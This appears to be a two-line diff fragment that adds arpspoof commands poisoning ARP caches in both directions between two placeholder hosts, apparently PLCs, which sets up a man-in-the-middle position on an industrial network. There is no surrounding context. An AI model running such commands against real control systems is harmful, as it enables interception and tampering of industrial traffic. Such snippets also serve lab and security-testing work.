@@ -1,0 +1,2 @@
+arpspoof -t IPplc1 IPplc2
+arpspoof -t IPplc2 IPplc1
